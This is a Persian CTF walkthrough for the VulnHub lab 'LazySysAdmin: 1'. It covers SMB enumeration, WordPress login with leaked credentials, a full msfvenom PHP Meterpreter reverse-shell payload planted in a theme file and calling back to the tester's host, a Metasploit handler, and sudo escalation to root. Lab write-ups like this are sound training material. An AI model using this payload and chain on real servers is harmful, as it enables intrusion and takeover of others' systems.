<div align="center">

# LazySysAdmin: 1

### گزارش حل چالش CTF از نوع Boot-to-Root

**شناسایی شبکه • بررسی آسیب‌پذیری‌ها • ارتقای سطح دسترسی**

[English](README.md) | [فارسی](README.fa.md)

![Platform](https://img.shields.io/badge/Platform-VulnHub-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner--Intermediate-orange)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)

</div>

---

## معرفی

LazySysAdmin: 1 یک چالش CTF از نوع Boot-to-Root است که برای افراد مبتدی تا متوسط طراحی شده و در وب‌سایت VulnHub منتشر شده است.

این چالش یک سرور لینوکسی را شبیه‌سازی می‌کند که به دلیل پیکربندی و مدیریت نامناسب سیستم، دارای ضعف‌های امنیتی است. هدف، شناسایی سرویس‌ها، کشف اطلاعات افشاشده، شناسایی آسیب‌پذیری‌ها، به‌دست‌آوردن دسترسی اولیه و در نهایت دستیابی به سطح دسترسی `root` است.

## دانلود ماشین آزمایشگاهی

می‌توانید ماشین مجازی LazySysAdmin: 1 را از وب‌سایت VulnHub دانلود کنید.

- **صفحه رسمی چالش:** [LazySysAdmin: 1 — VulnHub](https://www.vulnhub.com/entry/lazysysadmin-1,205/)
- **دانلود مستقیم:** [Lazysysadmin.zip](https://download.vulnhub.com/lazysysadmin/Lazysysadmin.zip)

| مشخصه | توضیحات |
|---|---|
| پلتفرم | VulnHub |
| نرم‌افزار مجازی‌سازی | VirtualBox یا VMware |
| سطح دشواری | مبتدی تا متوسط |
| نوع چالش | Boot-to-Root CTF |

---

## شناسایی شبکه (Network Discovery)

با استفاده از ابزار `netdiscover` دو دستگاه فعال را در شبکه محلی شناسایی کردیم:

- `192.168.43.220` — سیستم Kali Linux ما.
- `192.168.43.166` — ماشین هدف LazySysAdmin.

آدرس IP ماشین هدف برای ادامه بررسی‌ها `192.168.43.166` شناسایی شد.

![نتایج Netdiscover](screenshots/one.png)

## شناسایی سرویس SMB

با استفاده از Nmap و گزینه `-sV` سرویس‌های در حال اجرا و نسخه آن‌ها را روی ماشین هدف بررسی کردیم.

اسکن چندین پورت باز را نشان داد. از جمله پورت‌های `139` و `445` که معمولاً با سرویس SMB یا Server Message Block مرتبط هستند.

SMB یک پروتکل شبکه برای اشتراک‌گذاری فایل‌ها و منابع میان دستگاه‌هاست. تصمیم گرفتیم این سرویس را بررسی کنیم تا مشخص شود آیا منابع اشتراکی بدون احراز هویت قابل دسترسی هستند یا خیر.

اسکن همچنین سرویس‌های دیگری مانند SSH، HTTP، MySQL و IRC را شناسایی کرد که می‌توانستند در مراحل بعدی بررسی شوند.

دستور استفاده‌شده:

```bash
nmap -sV 192.168.43.166
```

![نتایج اسکن Nmap](screenshots/2.png)

## دسترسی ناشناس به SMB

سرویس SMB را بررسی کردیم و توانستیم بدون ارائه رمز عبور به آن متصل شویم.

این موضوع نشان می‌داد که سرویس امکان دسترسی بدون احراز هویت را فراهم می‌کند. در نتیجه، می‌توانستیم منابع اشتراکی موجود را بررسی کنیم و به دنبال فایل‌هایی بگردیم که حاوی اطلاعات مفید باشند.

![دسترسی ناشناس به SMB](screenshots/3.png)

## کشف فایل پیکربندی WordPress

با استفاده از شلی که به دست آورده بودیم، فایل‌های پیکربندی WordPress را بررسی کردیم و فایل `wp-config.php` را با استفاده از دستور `GET` دریافت کردیم.

با بررسی محتوای فایل، اطلاعات ورود زیر را پیدا کردیم:

- **نام کاربری:** `Admin`
- **رمز عبور:** `TogieMYSQL12345^^`

این اطلاعات سرنخ جدیدی برای بررسی پنل مدیریت WordPress در اختیار ما قرار داد.

![فایل پیکربندی WordPress](screenshots/4.png)

## ورود به WordPress

پس از کشف نام کاربری و رمز عبور در فایل `wp-config.php`، باید مشخص می‌کردیم که از این اطلاعات در کجا می‌توان استفاده کرد.

با استفاده از ابزار **Dirb**، آدرس زیر را برای بخش مدیریت WordPress شناسایی کردیم:

`http://192.168.43.166/wordpress/wp-admin/user/`

سپس اطلاعات ورود کشف‌شده را وارد کردیم:

- **نام کاربری:** `Admin`
- **رمز عبور:** `TogieMYSQL12345^^`

با موفقیت و با استفاده از این اطلاعات وارد رابط WordPress شدیم.

![ورود موفق به WordPress](screenshots/login_wp.png)

## کشف ویرایشگر پوسته WordPress

پس از بررسی پیشخوان WordPress، متوجه شدیم که امکان ویرایش فایل‌های پوسته از طریق پنل مدیریت وجود دارد.

ویرایشگر پوسته از آدرس زیر در دسترس بود:

`http://192.168.43.166/wordpress/wp-admin/theme-editor.php`

این موضوع باعث شد بررسی کنیم که آیا امکان سوءاستفاده از قابلیت ویرایش فایل‌های پوسته برای اجرای کد PHP روی سیستم هدف وجود دارد یا خیر.

این بررسی را در محیط آزمایشگاهی مجاز CTF ادامه دادیم.

![ویرایشگر پوسته WordPress](screenshots/editor_themes.png)

## ساخت Payload از نوع PHP Meterpreter

پس از کشف امکان ویرایش فایل‌های پوسته در WordPress، تصمیم گرفتیم بررسی کنیم که آیا می‌توان از این قابلیت برای ایجاد یک اتصال معکوس به سیستم Kali Linux استفاده کرد یا خیر.

با استفاده از `msfvenom` یک Payload از نوع PHP Meterpreter با اتصال معکوس TCP ساختیم. آدرس سیستم Kali Linux یعنی `192.168.43.220` را به‌عنوان آدرس بازگشت و پورت `888` را انتخاب کردیم.

دستور استفاده‌شده:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.220 LPORT=888 -f raw
```

تصویر زیر فرایند ساخت Payload را نشان می‌دهد.

![ساخت Payload با MSFvenom](screenshots/msfvenom.png)

### کد PHP تولیدشده

کد PHP زیر توسط `msfvenom` تولید شد:

```php
<?php /**/ error_reporting(0); $ip = '192.168.43.220'; $port = 888; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

این Payload برای اتصال به آدرس IP و پورت مشخص‌شده تنظیم شده بود. صرفاً تولید Payload باعث ایجاد نشست نمی‌شد؛ Payload باید روی سیستم هدف اجرا می‌شد و هم‌زمان یک Listener سازگار در حال گوش‌دادن می‌بود.

## قرار دادن Payload در پوسته WordPress

پس از تولید Payload مربوط به PHP Meterpreter، ویرایشگر پوسته WordPress را باز کردیم و کد را در فایل پوسته انتخاب‌شده قرار دادیم.

سپس تغییرات را ذخیره کردیم. هدف از این مرحله بررسی امکان اجرای Payload PHP از طریق فایل پوسته در محیط آزمایشگاهی مجاز CTF بود.

![قرار دادن Payload در ویرایشگر پوسته WordPress](screenshots/editor.png)

## راه‌اندازی Listener در Metasploit

در مرحله بعد، Metasploit Framework را با استفاده از `msfconsole` اجرا کردیم و یک `multi/handler` برای دریافت اتصال معکوس TCP پیکربندی کردیم.

Payload را روی `php/meterpreter/reverse_tcp` تنظیم کردیم و آدرس IP سیستم Kali Linux یعنی `192.168.43.220` و پورت `888` را در Listener قرار دادیم.

دستورات استفاده‌شده:

```text
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.43.220
set lport 888
exploit
```

Metasploit تأیید کرد که Handler راه‌اندازی شده و روی آدرس `192.168.43.220:888` در حال گوش‌دادن است.

![Listener در Metasploit](screenshots/msfconsol.png)

در این مرحله، Handler منتظر اتصال ورودی بود. سپس فایل پوسته تغییر‌یافته را درخواست کردیم تا Payload اجرا شود.

## به‌دست‌آوردن Shell

پس از راه‌اندازی Listener در Metasploit، درخواستی به آدرس فایل پوسته تغییر‌یافته WordPress ارسال کردیم:

`http://192.168.43.166/wordpress/wp-content/themes/twentyfifteen/404.php`

این درخواست Payload را فعال کرد و با موفقیت یک نشست Meterpreter ایجاد شد. در نتیجه، دسترسی اولیه به ماشین هدف را به دست آوردیم.

![به‌دست‌آوردن Shell](screenshots/get_Shell.png)

## شناسایی کاربران سیستم

پس از به‌دست‌آوردن دسترسی اولیه، سیستم را بررسی کردیم تا مسیرهای احتمالی ارتقای سطح دسترسی را شناسایی کنیم.

برای مشاهده حساب‌های کاربری محلی از دستور زیر استفاده کردیم:

```bash
cat /etc/passwd
```

![شناسایی کاربران سیستم](screenshots/passwd.png)

هنگام بررسی خروجی، حسابی با نام `togie` مشاهده کردیم. این حساب می‌توانست سرنخی برای ادامه بررسی باشد.

در این مرحله یک مسیر احتمالی برای دستیابی به سطح دسترسی بالاتر شناسایی شده بود، اما هنوز باید اطلاعات ورود و مجوزهای این حساب را بررسی می‌کردیم.

## کشف اطلاعات ورود از طریق SMB

پس از شناسایی کاربر `togie`، دوباره به سرویس SMB برگشتیم تا بررسی کنیم آیا فایل‌های اشتراکی حاوی اطلاعات مفیدی هستند یا خیر.

هنگام بررسی منابع SMB، فایلی با نام `deets.txt` پیدا کردیم. این فایل را با دستور زیر دانلود کردیم:

```text
smb: \> get deets.txt
getting file \deets.txt of size 139 as deets.txt (9.0 KiloBytes/sec) (average 156.3 KiloBytes/sec)
smb: \>
```

انتقال فایل با موفقیت انجام شد و فایل برای بررسی بیشتر در سیستم محلی ذخیره شد.

![اطلاعات ورود کشف‌شده در deets.txt](screenshots/password.png)

پس از بررسی فایل، رمز عبور مرتبط با حساب `togie` را پیدا کردیم:

- **نام کاربری:** `togie`
- **رمز عبور:** `12345`

این اطلاعات امکان بررسی حساب و مجوزهای آن را فراهم کرد.

## ارتقای سطح دسترسی به Root

در این مرحله اطلاعات ورود کاربر `togie` را در اختیار داشتیم. بااین‌حال، Shell فعلی به یک ترمینال تعاملی مناسب متصل نبود؛ بنابراین ابتدا باید یک TTY تعاملی ایجاد می‌کردیم.

### ایجاد TTY تعاملی

با استفاده از ماژول `pty` در Python یک Shell تعاملی Bash ایجاد کردیم:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

پس از اجرای دستور، یک Shell تعاملی دریافت کردیم:

```text
<ww/html/wordpress/wp-content/themes/twentyfifteen$
```

سپس توانستیم به کاربر `togie` تغییر حساب دهیم:

```bash
su togie
```

سیستم رمز عبور را درخواست کرد:

```text
Password: 12345
```

ورود موفقیت‌آمیز بود و اعلان ترمینال به حساب `togie` تغییر کرد:

```text
togie@LazySysAdmin:/var/www/html/wordpress/wp-content/themes/twentyfifteen$
```

### بررسی مجوزهای Sudo

پس از ورود به حساب `togie`، بررسی کردیم که این کاربر اجازه اجرای چه دستورهایی را با `sudo` دارد:

```bash
sudo -l
```

پس از واردکردن رمز عبور، خروجی زیر نمایش داده شد:

```text
[sudo] password for togie: 12345

Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
```

خط مهم در این خروجی عبارت بود از:

```text
(ALL : ALL) ALL
```

این خط نشان می‌داد که کاربر `togie` اجازه اجرای دستورها به‌عنوان هر کاربری، از جمله `root`، را دارد. این مجوز گسترده مسیر مستقیمی برای ارتقای سطح دسترسی فراهم کرد.

### دستیابی به Root

با استفاده از مجوزهای موجود، یک Shell با دسترسی root اجرا کردیم:

```bash
sudo su
```

اعلان ترمینال به شکل زیر تغییر کرد:

```text
root@LazySysAdmin:/var/www/html/wordpress/wp-content/themes/twentyfifteen#
```

این تغییر تأیید می‌کرد که با موفقیت به سطح دسترسی root در ماشین هدف رسیده‌ایم.

### یافتن فایل اثبات

پس از دستیابی به دسترسی root، محتویات پوشه `/root` را بررسی کردیم:

```bash
ls /root
```

خروجی، فایل زیر را نشان داد:

```text
proof.txt
```

سپس محتویات فایل را مشاهده کردیم:

```bash
cat /root/proof.txt
```

فایل شامل اثبات و پیام زیر بود:

```text
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851

Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie
```

فایل همچنین شامل چند رشته تصادفی دیگر بود:

```text
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
```

این رشته‌ها در فایل اصلی `proof.txt` وجود داشتند. رشته اول نیز به‌عنوان اثبات در ابتدای فایل نمایش داده شده بود.

![دسترسی Root و فایل اثبات](screenshots/flag.png)

## زنجیره کامل حمله

مسیر کامل طی‌شده در این چالش به شکل زیر بود:

**شناسایی شبکه → بررسی با Nmap → دسترسی ناشناس به SMB → کشف اطلاعات ورود → ورود به WordPress → ویرایشگر پوسته → ساخت Payload از نوع PHP Meterpreter → دریافت Shell معکوس → ایجاد TTY تعاملی → دسترسی به حساب `togie` → بررسی Sudo → دستیابی به Root → مشاهده `proof.txt`**

## نتیجه‌گیری

چالش LazySysAdmin نشان داد که چگونه می‌توان چند ضعف امنیتی را در کنار یکدیگر برای به‌دست‌آوردن کنترل یک سیستم لینوکسی آسیب‌پذیر استفاده کرد.

در طول این چالش، سرویس‌های شبکه را بررسی کردیم، منابع SMB قابل دسترسی بدون احراز هویت را شناسایی کردیم، اطلاعات ورود را به دست آوردیم، وارد پنل مدیریت WordPress شدیم و از امکان ویرایش فایل پوسته برای ایجاد دسترسی اولیه استفاده کردیم.

سپس حساب‌های کاربری محلی را بررسی کردیم، اطلاعات ورود کاربر `togie` را پیدا کردیم و متوجه شدیم این حساب می‌تواند دستورها را با مجوزهای نامحدود `sudo` اجرا کند. در نهایت، با استفاده از این مجوزها به سطح دسترسی root رسیدیم و فایل `/root/proof.txt` را خواندیم؛ به این ترتیب چالش تکمیل شد.

---

**این گزارش صرفاً برای اهداف آموزشی و محیط‌های آزمایشگاهی مجاز تهیه شده است.**
